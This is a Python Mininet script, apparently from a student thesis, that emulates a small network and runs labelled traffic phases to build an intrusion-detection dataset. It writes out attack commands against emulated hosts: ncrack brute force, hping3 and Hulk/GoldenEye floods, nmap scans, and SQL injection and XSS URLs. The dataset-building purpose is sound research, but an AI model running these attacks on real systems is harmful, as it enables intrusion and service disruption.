#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import time
from time import sleep
from datetime import datetime
from mininet.topo import Topo
from mininet.net import Mininet
from mininet.link import TCLink
from mininet.log import setLogLevel
from mininet.node import OVSKernelSwitch, RemoteController

# Import ZTATopo from topology_zta.py
sys.path.append("/home/vuxtrung/KLTN_ver2/Source Code/Mininet")
from topology_zta import ZTATopo

CSV_DIR = "/home/vuxtrung/KLTN_ver2/Source Code/Controller"
FILENAME_FILE = os.path.join(CSV_DIR, "current_filename.txt")
LABEL_FILE = os.path.join(CSV_DIR, "current_label.txt")

def count_lines(filename):
    path = os.path.join(CSV_DIR, filename)
    if not os.path.exists(path):
        return 0
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return sum(1 for _ in f)
    except Exception:
        return 0

def delete_old_csv(filename):
    path = os.path.join(CSV_DIR, filename)
    if os.path.exists(path):
        print(f"[*] Đang xóa tệp CSV cũ: {filename}")
        os.remove(path)

def set_controller_config(filename, label):
    print(f"\n[CONFIG] >>> Thiết lập ghi file: {filename} | Nhãn: {label} <<<")
    with open(FILENAME_FILE, "w") as f:
        f.write(filename)
    with open(LABEL_FILE, "w") as f:
        f.write(str(label))
    time.sleep(2)

def clear_switch_flows():
    print("[*] Đang xóa sạch các flow cũ trên các Switch...")
    for sw in ['s1', 's2', 's3', 's4']:
        os.system(f"sudo ovs-ofctl -O OpenFlow13 del-flows {sw} \"priority=1\" 2>/dev/null")
    time.sleep(2)

def kill_traffic_processes():
    print("[*] Đang dọn dẹp các tiến trình lưu lượng...")
    os.system("sudo pkill -9 -f ncrack")
    os.system("sudo pkill -9 -f slowloris")
    os.system("sudo pkill -9 -f slowhttptest")
    os.system("sudo pkill -9 -f hping3")
    os.system("sudo pkill -9 -f nmap")
    os.system("sudo pkill -9 -f curl")
    os.system("sudo pkill -9 -f hulk.py")
    os.system("sudo pkill -9 -f goldeneye.py")
    os.system("sudo pkill -9 -f nslookup")
    os.system("sudo pkill -9 -f ping")
    time.sleep(2)

def run_simulation():
    kill_traffic_processes()
    
    # Khởi tạo topo ZTA 8 hosts
    topo = ZTATopo()
    c0 = RemoteController('c0', ip='127.0.0.1', port=6653)
    net = Mininet(topo=topo, link=TCLink, controller=c0)

    print("[*] Đang khởi động mạng ảo ZTA Mininet...")
    net.start()
    
    h1 = net.get('h1')
    h2 = net.get('h2')
    h3 = net.get('h3')
    h4 = net.get('h4')
    h5 = net.get('h5')
    h6 = net.get('h6')
    h7 = net.get('h7')
    h8 = net.get('h8')

    print("[*] Khởi động web servers trên h1 và h2...")
    h1.cmd('python3 -m http.server 80 &')
    h2.cmd('python3 -m http.server 80 &')
    sleep(3)

    # ═══════════════════════════════════════════════════════════════
    # PHẦN 0: BENIGN (Nhãn 0)
    # ═══════════════════════════════════════════════════════════════
    csv_file = "benign.csv"
    delete_old_csv(csv_file)
    set_controller_config(csv_file, 0)
    clear_switch_flows()
    print("\n>>> KÍCH HOẠT: LƯU LƯỢNG SẠCH (Benign Background Traffic)...")
    
    h7.cmd('while true; do ab -n 30 -c 5 http://10.0.0.1/ >/dev/null 2>&1; sleep 1; done &')
    h8.cmd('while true; do ab -n 30 -c 5 http://10.0.0.2/ >/dev/null 2>&1; sleep 1; done &')
    h5.cmd('while true; do ping -c 3 10.0.0.1 >/dev/null; sleep 1; done &')
    h6.cmd('while true; do ping -c 3 10.0.0.2 >/dev/null; sleep 1; done &')
    h3.cmd('while true; do nslookup www.google.com 10.0.0.1 >/dev/null; sleep 1; done &')
    h4.cmd('while true; do nslookup www.google.com 10.0.0.2 >/dev/null; sleep 1; done &')

    print("[*] Đang thu thập Benign trong 45 giây...")
    sleep(45)
    kill_traffic_processes()
    sleep(5)

    # ═══════════════════════════════════════════════════════════════
    # PHẦN 1: BOTNET (Nhãn 1)
    # ═══════════════════════════════════════════════════════════════
    csv_file = "botnet.csv"
    delete_old_csv(csv_file)
    set_controller_config(csv_file, 1)
    clear_switch_flows()
    print("\n>>> KÍCH HOẠT: TẤN CÔNG BOTNET (C2 Heartbeats)...")
    
    h8.cmd('while true; do curl -s http://10.0.0.1/heartbeat >/dev/null; sleep 1; done &')
    h7.cmd('while true; do curl -s http://10.0.0.2/heartbeat >/dev/null; sleep 1; done &')

    print("[*] Đang thu thập Botnet trong 45 giây...")
    sleep(45)
    kill_traffic_processes()
    sleep(5)

    # ═══════════════════════════════════════════════════════════════
    # PHẦN 2: BRUTE FORCE (Nhãn 2)
    # ═══════════════════════════════════════════════════════════════
    csv_file = "bruteforce.csv"
    delete_old_csv(csv_file)
    set_controller_config(csv_file, 2)
    clear_switch_flows()
    print("\n>>> KÍCH HOẠT: TẤN CÔNG BRUTE FORCE (Ncrack HTTP)...")
    
    h8.cmd('while true; do ncrack -p 80 --user admin --pass admin 10.0.0.1; sleep 1; done >/dev/null 2>&1 &')
    h7.cmd('while true; do ncrack -p 80 --user admin --pass admin 10.0.0.2; sleep 1; done >/dev/null 2>&1 &')

    print("[*] Đang thu thập Brute Force trong 45 giây...")
    sleep(45)
    kill_traffic_processes()
    sleep(5)

    # ═══════════════════════════════════════════════════════════════
    # PHẦN 3: DDOS (Nhãn 3)
    # ═══════════════════════════════════════════════════════════════
    csv_file = "ddos.csv"
    delete_old_csv(csv_file)
    set_controller_config(csv_file, 3)
    clear_switch_flows()
    print("\n>>> KÍCH HOẠT: TẤN CÔNG DDOS (Multi-source Flood)...")
    
    h8.cmd('hping3 -S -p 80 -i u20000 10.0.0.1 >/dev/null 2>&1 &')
    h7.cmd('hping3 --udp -p 53 -i u20000 10.0.0.1 >/dev/null 2>&1 &')
    h6.cmd('hping3 -1 -i u20000 10.0.0.1 >/dev/null 2>&1 &')

    print("[*] Đang thu thập DDoS trong 45 giây...")
    sleep(45)
    kill_traffic_processes()
    sleep(5)

    # ═══════════════════════════════════════════════════════════════
    # PHẦN 4: DOS (Nhãn 4)
    # ═══════════════════════════════════════════════════════════════
    csv_file = "dos.csv"
    delete_old_csv(csv_file)
    set_controller_config(csv_file, 4)
    clear_switch_flows()
    print("\n>>> KÍCH HOẠT: TẤN CÔNG DOS (Hulk & GoldenEye)...")
    
    h8.cmd('python3 "/home/vuxtrung/KLTN_ver2/Source Code/Mininet/hulk.py" http://10.0.0.1/ >/dev/null 2>&1 &')
    h7.cmd('python3 "/home/vuxtrung/KLTN_ver2/Source Code/Mininet/goldeneye.py" http://10.0.0.2/ -w 20 -s 100 >/dev/null 2>&1 &')

    print("[*] Đang thu thập DoS trong 45 giây...")
    sleep(45)
    kill_traffic_processes()
    sleep(5)

    # ═══════════════════════════════════════════════════════════════
    # PHẦN 5: PORT SCAN (Nhãn 5)
    # ═══════════════════════════════════════════════════════════════
    csv_file = "portscan.csv"
    delete_old_csv(csv_file)
    set_controller_config(csv_file, 5)
    clear_switch_flows()
    print("\n>>> KÍCH HOẠT: TẤN CÔNG PORT SCAN (Nmap Scans)...")
    
    h8.cmd('while true; do nmap -sS -p 1-1000 10.0.0.1; sleep 2; done >/dev/null 2>&1 &')
    h7.cmd('while true; do nmap -sT -p 1-1000 10.0.0.2; sleep 2; done >/dev/null 2>&1 &')

    print("[*] Đang thu thập Port Scan trong 45 giây...")
    sleep(45)
    kill_traffic_processes()
    sleep(5)

    # ═══════════════════════════════════════════════════════════════
    # PHẦN 6: WEB ATTACK (Nhãn 6)
    # ═══════════════════════════════════════════════════════════════
    csv_file = "webattack.csv"
    delete_old_csv(csv_file)
    set_controller_config(csv_file, 6)
    clear_switch_flows()
    print("\n>>> KÍCH HOẠT: TẤN CÔNG WEB ATTACK (SQL Injection Loops)...")
    
    h8.cmd('while true; do curl -g \'http://10.0.0.1/?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users\' >/dev/null 2>&1; sleep 0.1; done &')
    h7.cmd('while true; do curl -g \'http://10.0.0.2/?q=%3Cscript%3Ealert(\"XSS\")%3C/script%3E\' >/dev/null 2>&1; sleep 0.1; done &')

    print("[*] Đang thu thập Web Attack trong 45 giây...")
    sleep(45)
    kill_traffic_processes()
    sleep(5)

    print("\n[*] Hoàn thành tất cả các giai đoạn thu thập dữ liệu multiclass trên topo ZTA!")
    os.system("sudo pkill -9 -f http.server")
    net.stop()

if __name__ == '__main__':
    setLogLevel('info')
    run_simulation()
